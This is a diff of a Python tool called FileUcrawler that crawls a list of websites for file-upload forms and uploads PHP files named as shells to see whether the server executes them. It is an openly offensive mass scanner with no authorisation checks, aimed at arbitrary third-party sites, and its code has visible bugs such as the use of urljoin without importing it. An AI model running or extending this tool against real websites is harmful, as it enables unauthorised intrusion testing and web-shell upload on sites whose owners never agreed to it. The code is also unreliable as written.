@@ -1,44 +1,75 @@
-import requests
-from bs4 import BeautifulSoup
+import urllib.request
+import urllib.parse
+import mimetypes
+from html.parser import HTMLParser
 import sys
-from concurrent.futures import ThreadPoolExecutor
+
+class FormParser(HTMLParser):
+    def __init__(self):
+        super().__init__()
+        self.in_form = False
+        self.current_form_action = None
+        self.current_form_method = None
+        self.file_upload_found = False
+        self.file_upload_pages = []
+
+    def handle_starttag(self, tag, attrs):
+        attrs_dict = dict(attrs)
+        if tag == 'form':
+            self.in_form = True
+            self.current_form_action = attrs_dict.get('action', '')
+            self.current_form_method = attrs_dict.get('method', 'get')
+
+        if self.in_form and tag == 'input':
+            input_type = attrs_dict.get('type', '')
+            if input_type == 'file':
+                self.file_upload_found = True
+                if self.current_form_action:
+                    self.file_upload_pages.append((self.current_form_action, self.current_form_method))
+
+    def handle_endtag(self, tag):
+        if tag == 'form':
+            self.in_form = False
+
+    def get_file_upload_pages(self):
+        return self.file_upload_pages
 
 class FileUploadFinder:
     def __init__(self, url):
-        self.url = url
-        self.base_url = url
-        self.file_upload_pages = set()
-        self.visited = set()
+        self.url = url if url.startswith('http') else 'https://' + url
 
     def find_file_upload(self):
-        if self.url not in self.visited:
-            self.visited.add(self.url)
+        try:
+            response = urllib.request.urlopen(self.url)
+            content_type = response.headers.get('Content-Type')
+            encoding = 'utf-8'
+            
+            if content_type and 'charset=' in content_type:
+                encoding = content_type.split('charset=')[-1]
 
-            try:
-                response = requests.get(self.url)
-                if response.status_code == 200:
-                    soup = BeautifulSoup(response.content, 'html.parser')
-                    forms = soup.find_all('form')
+            page_content = response.read().decode(encoding, errors='ignore')
+        except urllib.error.URLError as e:
+            print(f"Error accessing {self.url}: {e}")
+            return []
+        except Exception as e:
+            print(f"Unexpected error: {e}")
+            return []
 
-                    for form in forms:
-                        if form.find('input', {'type': 'file'}):
-                            self.file_upload_pages.add(self.url)
-                            break
+        parser = FormParser()
+        parser.feed(page_content)
+        file_upload_pages = [(urljoin(self.url, page[0]), page[1]) for page in parser.get_file_upload_pages()]
 
-                    links = soup.find_all('a', href=True)
-                    for link in links:
-                        href = requests.compat.urljoin(self.base_url, link['href'])
-                        if href.startswith(self.base_url):
-                            finder = FileUploadFinder(href)
-                            finder.find_file_upload()
-            except Exception as e:
-                print(f"Error crawling {self.url}: {str(e)}")
+        if not file_upload_pages:
+            print(f"No file upload form found at {self.url}\n")
+        else:
+            print(f"\033[93mFile upload found at the following pages for {self.url}:\033[0m")
+            for page, method in file_upload_pages:
+                print(f"  - {page} ({method.upper()})")
+            print()
 
-class FileUploadTester:
-    def __init__(self, url):
-        self.url = url
+        return file_upload_pages
 
-    def test_file_upload(self, form_action):
+    def test_file_upload(self, form_action, form_method):
         files_to_test = {
             'php_shell.php': '<?php echo "Shell"; ?>',
             'php_shell.phtml': '<?php echo "Shell"; ?>',
@@ -56,7 +87,7 @@ class FileUploadTester:
             data = (
                 f'--{boundary}\r\n'
                 f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
-                f'Content-Type: application/octet-stream\r\n\r\n'
+                f'Content-Type: {mimetypes.guess_type(filename)[0] or "application/octet-stream"}\r\n\r\n'
                 f'{content}\r\n'
                 f'--{boundary}--\r\n'
             ).encode('utf-8')
@@ -65,90 +96,83 @@ class FileUploadTester:
                 'Content-Type': f'multipart/form-data; boundary={boundary}'
             }
 
+            request = urllib.request.Request(urljoin(self.url, form_action), data=data, headers=headers)
+            if form_method.lower() == 'post':
+                request.method = 'POST'
+            else:
+                request.method = 'GET'
+
             try:
-                response = requests.post(form_action, data=data, headers=headers)
-                if "Shell" in response.text:
-                    print(f"\033[91mVulnerability found on {self.url}\033[0m")
+                response = urllib.request.urlopen(request)
+                response_content = response.read().decode('utf-8')
+                if "Shell" in response_content:
+                    print(f"\033[91mVulnerability found: {filename} uploaded and executed on {self.url}\033[0m\n")
                     return True
             except Exception as e:
-                print(f"Error testing {form_action}: {str(e)}")
+                print(f"Error during file upload test: {e}")
 
         return False
 
 def print_banner():
     banner = """
-███████╗██╗██╗     ███████╗██╗   ██╗ ██████╗██████╗  █████╗ ██╗    ██╗██╗     
-██╔════╝██║██║     ██╔════╝██║   ██║██╔════╝██╔══██╗██╔══██╗██║    ██║██║     
-█████╗  ██║██║     █████╗  ██║   ██║██║     ██████╔╝███████║██║ █╗ ██║██║     
-██╔══╝  ██║██║     ██╔══╝  ██║   ██║██║     ██╔══██╗██╔══██║██║███╗██║██║     
-██║     ██║███████╗███████╗╚██████╔╝╚██████╗██║  ██║██║  ██║╚███╔███╔╝███████╗
-╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝
-                                                                              
+  ___ _ _     _   _                    _ 
+ | __(_) |___| | | |__ _ _ __ ___ __ _| |
+ | _|| | / -_) |_| / _| '_/ _` \ V  V / |
+ |_| |_|_\___|\___/\__|_| \__,_|\_/\_/|_|
+                                         
+                                           
   \033[92mTool by Miftaul Amin\033[0m
 """
     print(banner)
 
 if __name__ == "__main__":
-    print_banner()
-
-    if len(sys.argv) != 3:
-        print("Usage: python FileUcrawler.py -l <websitelist.txt>")
+    if len(sys.argv) < 3 or len(sys.argv) > 5:
+        print("Usage: python FileUcrawler.py -l <websitelist.txt> [-o <outputfile.txt>]")
         sys.exit(1)
 
-    if sys.argv[1] != '-l':
+    print_banner()
+
+    output_file = None
+    if '-o' in sys.argv:
+        output_index = sys.argv.index('-o')
+        output_file = sys.argv[output_index + 1]
+        sys.argv = sys.argv[:output_index] + sys.argv[output_index + 2:]
+
+    if sys.argv[1] == '-l':
+        try:
+            with open(sys.argv[2], 'r') as f:
+                urls = [line.strip() for line in f.readlines()]
+
+            found_urls = []
+            vulnerable_urls = []
+
+            for url in urls:
+                print(f"Checking website: {url}")
+                finder = FileUploadFinder(url)
+                file_upload_pages = finder.find_file_upload()
+
+                if file_upload_pages:
+                    found_urls.append(url)
+                    for action, method in file_upload_pages:
+                        if finder.test_file_upload(action, method):
+                            vulnerable_urls.append(url)
+                else:
+                    print(f"No file upload form found at {url}\n")
+
+            if output_file:
+                with open(output_file, 'w') as f:
+                    f.write("Websites with file uploading found:\n")
+                    for url in found_urls:
+                        f.write(f"{url}\n")
+                    f.write("\nWebsites with potential vulnerabilities found:\n")
+                    for url in vulnerable_urls:
+                        f.write(f"{url}\n")
+
+            print("\n**FileUcrawler**")
+            print("Status: Completed")
+        except FileNotFoundError:
+            print("Error: The file specified does not exist.")
+            sys.exit(1)
+    else:
         print("Error: Invalid flag. Please use -l <websitelist.txt>")
-        sys.exit
-
-    try:
-        with open(sys.argv[2], 'r') as f:
-            urls = [line.strip() for line in f.readlines()]
-
-        found_urls = []
-        vulnerable_urls = []
-
-            with ThreadPoolExecutor(max_workers=5) as executor:
-        futures = []
-        for url in urls:
-            if not url.startswith(("http://", "https://")):
-                url = "https://" + url
-            print(f"\n\033[94mChecking website: {url}\033[0m")
-            crawler = FileUploadFinder(url)
-            futures.append(executor.submit(crawler.find_file_upload))
-
-        for future in futures:
-            future.result()
-
-    for url in urls:
-        if not url.startswith(("http://", "https://")):
-            url = "https://" + url
-        print(f"\n\033[94mChecking website: {url}\033[0m")
-        crawler = FileUploadFinder(url)
-        crawler.scan_known_upload_paths()
-
-        file_upload_pages = crawler.file_upload_pages
-        if file_upload_pages:
-            found_urls.append(url)
-            print(f"\033[93mFile upload found at the following pages for {url}:\033[0m")
-            for page in file_upload_pages:
-                print(f"  - {page}")
-                tester = FileUploadTester(page)
-                if tester.test_file_upload(page):
-                    vulnerable_urls.append(url)
-        else:
-            print(f"No file upload form found at {url}\n")
-
-    if output_file:
-        with open(output_file, 'w') as f:
-            f.write("Websites with file uploading found:\n")
-            for url in found_urls:
-                f.write(f"{url}\n")
-            f.write("\nWebsites with potential vulnerabilities found:\n")
-            for url in vulnerable_urls:
-                f.write(f"{url}\n")
-
-    print("\n\033[92m**FileUcrawler** by Miftaul Amin\033[0m")
-    print("Status: Completed")
-except FileNotFoundError:
-    print("Error: The file specified does not exist.")
-    sys.exit(1)
-
+        sys.exit(1)
